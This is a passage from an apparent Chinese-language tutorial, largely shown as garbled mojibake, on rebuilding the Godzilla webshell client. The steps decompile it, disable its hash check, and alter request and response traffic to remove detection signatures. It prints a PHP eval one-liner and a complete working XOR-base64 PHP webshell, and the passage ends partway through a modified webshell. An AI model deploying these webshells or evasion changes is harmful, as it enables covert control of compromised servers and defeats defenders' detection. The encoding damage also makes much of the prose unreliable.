href="https://www.decompiler.com/%EF%BC%8C%E7%9B%B4%E6%8E%A5%E6%8B%96%E5%85%A5jar%E5%8C%85%E5%8D%B3%E5%8F%AF%EF%BC%8C%E5%BE%88%E6%96%B9%E4%BE%BF%E3%80%82">https://www.decompiler.com/ï¼Œç›´æ¥æ‹–å…¥jaråŒ…å³å¯ï¼Œå¾ˆæ–¹ä¾¿ã€‚</a></p><p>å½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨ideaçš„æ’ä»¶è¿›è¡Œåç¼–è¯‘ï¼Œéƒ½ä¸€æ ·ã€‚</p><p>okå¼€å§‹</p><h5 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h5><p>å…ˆæ”¹ä¸ªåç§°è¯•è¯•çœ‹</p><p>ä¸‹è½½å¥½åŸç‰ˆå“¥æ–¯æ‹‰ï¼Œç„¶åæ‹–åˆ°åç¼–è¯‘ç½‘ç«™ï¼Œåç¼–è¯‘å®Œæˆåä¼šçœ‹åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œè§£å‹ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903145356766.png" alt="image-20240903145356766"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903145521615.png" alt="image-20240903145521615"></p><p>ç„¶åæ–°å»ºä¸€ä¸ªlibç›®å½•ï¼Œå°†åŸç‰ˆçš„godzillaæ‹–è¿›å»ï¼Œåœ¨å°†åˆšåˆšåç¼–è¯‘åçš„ç›®å½•æ‹–åˆ°é¡¹ç›®ç›®å½•ä¸‹</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903150913660.png" alt="image-20240903150913660"></p><p>æ¥ç€å»ºç«‹ä¾èµ–å…³ç³»ã€‚</p><p>settings-&gt;Project Structure</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903153231158.png" alt="image-20240903153231158"></p><p>ç„¶åè®¾ç½®ä¾èµ–æ·»åŠ æˆ‘ä»¬ä¸Šé¢libé‡Œçš„å“ªä¸ªåŸç‰ˆjaråŒ…ï¼Œå¹¶ä¸”é€‰ä¸­ï¼Œè¿™é‡Œç¬”è€…å»ºè®®ç”¨jdk1.8ï¼Œæˆ‘ç”¨java15å¥½åƒä¸å¤ªè¡Œ</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903153401751.png" alt="image-20240903153401751"></p><p>æ¥ç€æ·»åŠ ä¸»ç±»ï¼Œ</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903153706210.png" alt="image-20240903153706210"></p><p>èµ°åˆ°è¿™ä¸€æ­¥ï¼Œæˆ‘ä»¬ä¼šå‘ç°ï¼Œå¹¶æ²¡æœ‰å…¶ä»–å¤§ä½¬æ–‡ç« ä¸­è¯´çš„æœ‰uié‡Œçš„é‚£ä¸ªä¸»ç±»ï¼Œæ˜¯å› ä¸ºå°‘äº†ä¸€éƒ¨ã€‚</p><p>æˆ‘ä»¬æ¥ç€è¦å°†åç¼–è¯‘çš„src\META-INF/MANIFEST.MFæºæ–‡ä»¶ï¼Œæ”¾åˆ°srcä¸‹é¢ï¼Œæ³¨æ„è·¯å¾„ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903154657989.png" alt="image-20240903154657989"></p><p>ç„¶ååŒæ ·å¤åˆ¶decompiled_src/core/ui/MainActivity.javaæ–‡ä»¶åˆ°srcç›®å½•ä¸‹</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903154931142.png" alt="image-20240903154931142"></p><p>è¿™æ ·å³å¯</p><p>æ¥ç€æ·»åŠ ä¸»ç±»ï¼Œ</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903153706210.png" alt="image-20240903153706210"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903155037743.png" alt="image-20240903155037743"></p><p>å³å¯ã€‚</p><h5 id="æ”¹æ ‡é¢˜"><a href="#æ”¹æ ‡é¢˜" class="headerlink" title="æ”¹æ ‡é¢˜"></a>æ”¹æ ‡é¢˜</h5><p>ç°åœ¨å°±å¯ä»¥ç¼–è¯‘äº†ï¼Œæˆ‘ä»¬å…ˆç®€å•çš„æ”¹ä¸€ä¸‹æ ‡é¢˜ã€‚</p><p>å¤åˆ¶ä¸€ä»½æ–‡ä»¶ï¼Œgodzillaçš„æ ‡é¢˜åœ¨core/MainActivity.javaå¤åˆ¶src/core/MainActivity.javaï¼Œæ²¡æœ‰çš„ç›®å½•è¦åˆ›å»ºä¸€ä¸‹ã€‚ç›®å½•ä¸€å®šè¦å¯¹é½ã€‚è¿™é‡Œä¸€å®šè¦æ¸…æ¥šï¼Œä¸è¦åœ¨åŸç‰ˆçš„é‚£ä¸ªå’Œç¼–è¯‘çš„é‚£äº›æ–‡ä»¶é‡Œæ”¹ï¼Œæƒ³æ”¹ä»€ä¹ˆï¼ŒæŠŠç›®å½•å¯¹é½ï¼Œåˆ›å»ºå¤åˆ¶æ–‡ä»¶ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903160041594.png" alt="image-20240903160041594"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903160220038.png" alt="image-20240903160220038"></p><p>æ¬§å…‹ï¼Œæ¥ä¸‹æ¥ç¼–è¯‘</p><p>å…ˆbuild project</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903160353962.png" alt="image-20240903160353962"></p><p>åœ¨build artifacts build</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903160441514.png" alt="image-20240903160441514"></p><p>ç¼–è¯‘å®Œæˆåï¼Œåœ¨é¡¹ç›®ç›®å½•ä¸‹é¢çš„out/artifacts/ä¸‹é¢å°±ä¼šæœ‰ç¼–è¯‘å¥½çš„godzilla</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903160604410.png" alt="image-20240903160604410"></p><p>æ¥ç€å°±ä¼šå‘ç°å‡ºç°hashé”™è¯¯ï¼Œæ¥ç€æ”¹ï¼Œ</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903160730366.png" alt="image-20240903160730366"></p><p>åœ¨core/ApplicationConfig.java<code>å¤åˆ¶åˆ°</code>src/core/ApplicationConfig.javaï¼Œ</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903161356407.png" alt="image-20240903161356407"></p><p>å°†ä¸­é—´çš„å››è¡Œå¯¹æ¯”æ³¨é‡Šæ‰å³å¯ã€‚</p><p>ç„¶åé‡æ–°buildã€‚é‡æ–°artifactsç¼–è¯‘å³å¯ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903161513631.png" alt="image-20240903161513631"></p><p>okï¼Œæ²¡æœ‰é—®é¢˜ã€‚ç¬”è€…è¿™é‡Œå¹¶æ²¡æœ‰ç»è¿‡ä½œè€…çš„åŒæ„å»äºŒå¼€ï¼Œå’ŒéªŒè¯ã€‚å¥ˆä½•æˆ‘å¤ªèœï¼Œè”ç³»ä¸åˆ°å¤§ä½¬ï¼Œå¦‚æœæœ‰ä¾µæƒï¼Œç•™ä¸ªè¨€åˆ é™¤ã€‚</p><h5 id="å…¨å±€æ”¹é€ "><a href="#å…¨å±€æ”¹é€ " class="headerlink" title="å…¨å±€æ”¹é€ "></a>å…¨å±€æ”¹é€ </h5><p>æˆ‘ä»¬çŸ¥é“ï¼Œgodzillaå’ŒBehinderéƒ½æœ‰ä¸€äº›å¼ºç‰¹å¾ï¼Œæˆ‘ä»¬å¯ä»¥åŠ ä¸€ä¸‹æ··æ·†æˆ–è€…ç®€å•æ”¹æ”¹ã€‚</p><p>åœ¨/core/ui/component/frame/ShellSetting.javaçš„æ–‡ä»¶ä¸­ï¼Œ</p><p>å¤§æ¦‚290è¡Œï¼Œè®¾ç½®ä¸€ä¸‹uaï¼Œ<img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903164934529.png" alt="image-20240903164934529"></p><p>ç›´æ¥ç»™ä»–å†™æ­»ï¼Œè¿™æ ·çš„è¯æ—¢å¯ä»¥æ¯æ¬¡æ‰“å¼€ä¸ç”¨è‡ªå·±æ”¹äº†ã€‚</p><p>è¿˜æœ‰ä¸‹é¢çš„ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">this.leftTextArea.setText(&quot;page=1&amp;size=10&amp;&quot;);</span><br><span class="line">this.rightTextArea.setText(&quot;&amp;Name=manager&quot;);</span><br></pre></td></tr></table></figure><p>å·¦å³è¿½åŠ æ•°æ®ï¼Œæˆ‘ä»¬ä¹Ÿç»™ä»–å†™æ­»ï¼Œè¿™æ ·ï¼Œå°±ä¸ç”¨æ¯æ¬¡å†™äº†ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903170904953.png" alt="image-20240903170904953"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903171100398.png" alt="image-20240903171100398"></p><p>okï¼Œæ¯”è¾ƒæ–¹ä¾¿ï¼Œå½“ç„¶è¿™é‡Œä½ æƒ³åŠ ä»€ä¹ˆéƒ½å¯ä»¥ï¼Œè¿™é‡Œåªæ˜¯æ·»åŠ ä¸€äº›å‚æ•°ã€‚</p><p>ç„¶åæ˜¯ä¸€ä¸ªè¯·æ±‚ä½“çš„ä¿®æ”¹ï¼Œåœ¨å…¶ä»–å¤§å¸ˆå‚…çš„æ–‡ç« ä¸­çœ‹åˆ°ï¼Œ</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918104429991.png" alt="image-20240918104429991"></p><p>å°±æ˜¯è¿™ä¸ªè¯·æ±‚åŒ…ä¸­cookieä¸­æœ‰åˆ†å·ï¼Œè¿™æ˜¯ä¸€ä¸ªå¼ºç‰¹å¾ï¼Œè¿™é‡Œå’±ä»¬æ²¡æœ‰åŠæ³•éªŒè¯ï¼Œå¬å°±è¡Œäº†ï¼Œç»™ä»–å»æ‰ï¼Œ</p><p>ç¬”è€…æ”¹çš„å“¥æ–¯æ‹‰ç‰ˆæœ¬åœ¨src\util\http\HttpResponse.javaä¸‹ï¼Œ</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918104650774.png" alt="image-20240918104650774"></p><p>é»˜è®¤æ˜¯``cookies.forEach(cookie -&gt; sb.append(String.format(â€œ %s=%s;â€, cookie.getName(), cookie.getValue())));`</p><p>å»æ‰ï¼›å³å¯ã€‚æ‰“åŒ…ç¼–è¯‘ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918104914935.png" alt="image-20240918104914935"></p><p>okï¼Œæ²¡æœ‰ä»»ä½•é—®é¢˜ã€‚</p><h5 id="godzilla-ç»“æ„"><a href="#godzilla-ç»“æ„" class="headerlink" title="godzilla ç»“æ„"></a>godzilla ç»“æ„</h5><p>æ²¡å¼€å§‹ä¹‹å‰å’±ä»¬å…ˆçœ‹ä¸‹ä¸€Godzillaçš„shellå¤§æ¦‚æ„é€ </p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918105209856.png" alt="image-20240918105209856"></p><p>åœ¨shellç›®å½•ä¸‹ï¼Œæœ‰ä¸‰ä¸ªç›®å½•ï¼Œä¸€ä¸ªæ˜¯åŠ å¯† è§£å¯†æ¨¡å—ï¼Œä¹Ÿå°±æ˜¯å‘é€çš„payloadçš„åœ¨æœ¬åœ°åŠ å¯†ï¼Œå‘é€ï¼Œä»å®¢æˆ·ç«¯è§£å¯†è¿”å›ç»™ç”¨æˆ·ï¼Œpayloadå°±æ˜¯å„ç§åŠŸèƒ½ï¼Œæ¯”å¦‚è¯»å–ï¼Œä¸Šä¼ ï¼Œæ–‡ä»¶ã€æ•°æ®åº“çš„æ“ä½œç­‰ç­‰ï¼Œpluginså¾ˆå¥½ç†è§£ï¼Œå°±æ˜¯å„ç§è¯­è¨€çš„æ’ä»¶ï¼Œbypassdisable_functionï¼Œææƒï¼Œå‹ç¼©ï¼Œå†…å­˜é©¬ç­‰ç­‰ã€‚</p><p>è¿™é‡Œè¯´ä¸€ä¸ªshellç›®å½•ï¼Œshellç›®å½•ä¸‹æœ‰å„ç§è¯­è¨€çš„shellï¼Œæ¯ä¸ªè¯­è¨€ä¸‹æœ‰ä¸€ä¸ªGenerate.javaæ–‡ä»¶ï¼Œä»–æ˜¯ç”¨æ¥ç”Ÿæˆgodzillaæœ¨é©¬çš„æ¡†æ¶ã€‚ç„¶åå°±æ˜¯è¦ç”Ÿæˆæœ¨é©¬ã€‚æˆ‘ä»¬ç‚¹å¼€libç›®å½•ä¸‹çš„godzilla.jarï¼Œç„¶åæ˜¯shell  phpä¸‹é¢çš„</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918112104994.png" alt="image-20240918112104994"></p><p>è¿™äº›*.binå¯¹åº”çš„æ˜¯è¿™ä¸ªç”Ÿæˆçš„åŠ å¯†å™¨ã€‚ä¹Ÿå°±æ˜¯xor  base64å•¥çš„</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918112156254.png" alt="image-20240918112156254"></p><p>ç›¸åº”çš„ä¸‹é¢ä¸‰ä¸ªæ˜¯åŠ å¯† è§£å¯†æ•°æ®åŒ…çš„ä»£ç ã€‚å…¶ä»–çš„è¯­è¨€ä¹Ÿå¤§å·®ä¸å·®ã€‚</p><p>è¿™å°±æ˜¯godzilla  shellæ–¹é¢å¤§è‡´çš„ç†è§£ï¼Œç›®å‰äºŒå¼€godzillaç”¨åˆ°è¿™äº›å°±å¤Ÿäº†ã€‚å…¶å®æ˜¯å…¶ä»–çš„æˆ‘ä¹Ÿä¸å¤ªæ‡‚ã€‚</p><h5 id="php"><a href="#php" class="headerlink" title="php"></a>php</h5><p>å¥½çš„ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å¼€å§‹æ”¹æµé‡ï¼Œå…ˆä»phpå¼€å§‹ã€‚</p><p>æˆ‘ä»¬å…ˆæ¥çœ‹æœ€åŸç‰ˆçš„ä¸€å¥è¯æœ¨é©¬ï¼Œè¿™é‡Œè¯´ä¸€ä¸‹ï¼Œgodzillaæ˜¯æ”¯æŒä¸€å¥è¯æœ¨é©¬çš„ã€‚æœ‰å¥½å¤šåŒå­¦é¢è¯•çš„æ—¶å€™è¢«é—®åˆ°godzillaæ”¯ä¸æ”¯æŒä¸€å¥è¯ï¼Œå¥½å¤šåŒå­¦ä¸çŸ¥é“ã€‚å…¶å®ä»–æ˜¯æ”¯æŒã€‚</p><p>å¥½ï¼Œå…ˆæ¥çœ‹ä¸€å¥è¯çš„åŠ å¯†å™¨æ˜¯ PHP_EVAL_XOR_BASE64ï¼Œä»–ç”Ÿæˆçš„æœ¨é©¬å°±æ˜¯ä¸€å¥è¯&lt;?php<br>eval($_POST[â€œpassâ€]);</p><p>æ¥ç€æˆ‘ä»¬çœ‹å¯¹åº”çš„ä»£ç ï¼Œåœ¨generateä¸­ï¼Œåˆ¤æ–­æœ‰æ²¡æœ‰binæ–‡ä»¶ï¼Œç„¶åæ›¿æ¢pass key</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918112958362.png" alt="image-20240918112958362"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918113110726-17266302715431.png" alt="image-20240918113110726"></p><p>evalçš„ğŸã€‚å¦‚æœè¿™ä¸ªï¼Œæˆ‘ä»¬åƒä¸Šé¢ä¸€æ ·ï¼Œåœ¨srcç›®å½•ä¸‹æ–°å»ºæ–‡ä»¶ï¼Œä¸€æ ·å¯ä»¥æ›¿æ¢æ‰çš„ã€‚</p><p>ç„¶åæ˜¯payloadå‘é€ï¼Œåœ¨phpevalxor.javaä»£ç ä¸­ï¼Œå¯ä»¥çœ‹åˆ°å…·ä½“ä»£ç ï¼Œæ¯”å¦‚å¼‚æˆ–ï¼Œbase64ï¼Œä¼ å‚ç­‰ã€‚</p><p>å¤§å®¶å¯ä»¥è¯»è¯»ä»£ç ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918113403277.png" alt="image-20240918113403277"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918113415634.png" alt="image-20240918113415634"></p><p>å¥½ï¼Œè¿™é‡Œæˆ‘ä»¬ä¸å»æ”¹å˜åŸæœ‰çš„ä»£ç ï¼Œæˆ‘ä»¬æ–°åŠ ä¸€ä¸ªåŠ å¯†å™¨ã€‚æ”¹çš„æ˜¯xorç„¶åbase64çš„åŠ å¯†å™¨ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918134822003.png" alt="image-20240918134822003"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918135051300.png" alt="image-20240918135051300"></p><p>å¥½  æˆ‘ä»¬å…ˆæ¥æ‰“åŒ…çœ‹çœ‹</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918135414650-17266388554662.png" alt="image-20240918135414650"></p><p>æ²¡æœ‰é—®é¢˜ï¼Œgodzillaxor base64çš„æœ¨é©¬æ˜¯è¿™æ ·çš„ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@session_start();</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$D</span>,<span class="variable">$K</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$D</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$K</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">        <span class="variable">$D</span>[<span class="variable">$i</span>] = <span class="variable">$D</span>[<span class="variable">$i</span>]^<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$D</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$pass</span>=<span class="string">&#x27;pass&#x27;</span>;</span><br><span class="line"><span class="variable">$payloadName</span>=<span class="string">&#x27;payload&#x27;</span>;</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;3c6e0b8a9c15224a&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]))&#123;</span><br><span class="line">    <span class="variable">$data</span>=encode(base64_decode(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]),<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]))&#123;</span><br><span class="line">        <span class="variable">$payload</span>=encode(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>],<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$payload</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)===<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$payload</span>=encode(<span class="variable">$payload</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="keyword">echo</span> substr(md5(<span class="variable">$pass</span>.<span class="variable">$key</span>),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">echo</span> base64_encode(encode(@run(<span class="variable">$data</span>),<span class="variable">$key</span>));</span><br><span class="line">        <span class="keyword">echo</span> substr(md5(<span class="variable">$pass</span>.<span class="variable">$key</span>),<span class="number">16</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$data</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]=encode(<span class="variable">$data</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ä»£ç ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ</p><p>eval($payload);<br>        echo substr(md5($pass.$key),0,16);<br>        echo base64_encode(encode(@run($data),$key));<br>        echo substr(md5($pass.$key),16);</p><p>å‘é€çš„æ•°æ®æŠ¥ä¸ºè¾“å‡ºpasså’Œkeyçš„md5å€¼å‰åå…­ä½ï¼Œæ•°æ®å¼‚æˆ–çš„å€¼ï¼Œæ¥ç€è¾“å‡ºååå…­ä½</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918140534539.png" alt="image-20240918140534539"></p><p>è¿™æ˜¯åŸç‰ˆçš„è¯·æ±‚æµé‡ï¼Œä¹Ÿä¸æ˜¯åŸç‰ˆ</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918140635648.png" alt="image-20240918140635648"></p><p>åŸç‰ˆæ˜¯è¿™æ ·çš„ï¼Œæˆ‘ä»¬åˆšåˆšå®šæ­»äº†å·¦å³æ·»åŠ æ•°æ®ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918140727136.png" alt="image-20240918140727136"></p><p>å›æ˜¾åŒ…ï¼Œçœ‹åˆ°MD5å‰16  è¿”å›å€¼å¼‚æˆ– å’Œå16ä½ã€‚</p><p>è¿™é‡Œå‘é€çš„åŒ…æš‚æ—¶ä¸æ”¹äº†ï¼Œå› ä¸ºå‘é€çš„åŒ…æ”¹çš„è¯éœ€è¦æ”¹å‘é€çš„payloadï¼Œè¿”å›åŒ…æ”¹äº†ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918141531019.png" alt="image-20240918141531019"></p><p>åœ¨è¿”å›åŒ…çš„ä»£ç ä¸­æœ‰ä¸€ä¸ªå‡½æ•°ï¼Œä¼ é€’äº†this.findStrLeft, this.findStrRightï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢å®šä¹‰çš„</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918141621610.png" alt="image-20240918141621610"></p><p>md5çš„å‰å16ä½ï¼Œctrl+submiddlestr ä¼šå‘ç°ï¼Œå°±æ˜¯å°†å·¦è¾¹çš„æ•°æ®ï¼ŒåŠ è¿”å›çš„æ•°æ®ï¼ŒåŠ 16ä½åæ•°æ®</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918141725742.png" alt="image-20240918141725742"></p><p>okï¼Œæˆ‘ä»¬ç»™ä»–å˜ä¸‹å‹ï¼Œ</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918141914961.png" alt="image-20240918141914961"></p><p>å·¦å³è¿½åŠ æ•°æ®æ³¨é‡Šæ‰ï¼Œç„¶åæ·»åŠ ä¸€ä¸ªè¿”å›ä¿¡æ¯ã€‚jsonæ ¼å¼ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918142315774.png" alt="image-20240918142315774"></p><p>æˆ‘ä»¬çš„æœ¨é©¬ä¸­ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯è¾“å‡ºçš„MD5ï¼Œè¿™æ ·è‚¯å®šä¸è¡Œï¼Œæˆ‘ä»¬ç»™ä»–æ”¹ä¸€ä¸‹ï¼Œæ”¹æˆç¬¦åˆæˆ‘ä»¬çš„åŠ å¯†æ–¹å¼çš„ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@session_start();</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$D</span>,<span class="variable">$K</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$D</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$K</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">        <span class="variable">$D</span>[<span class="variable">$i</span>] = <span class="variable">$D</span>[<span class="variable">$i</span>]^<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$D</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span 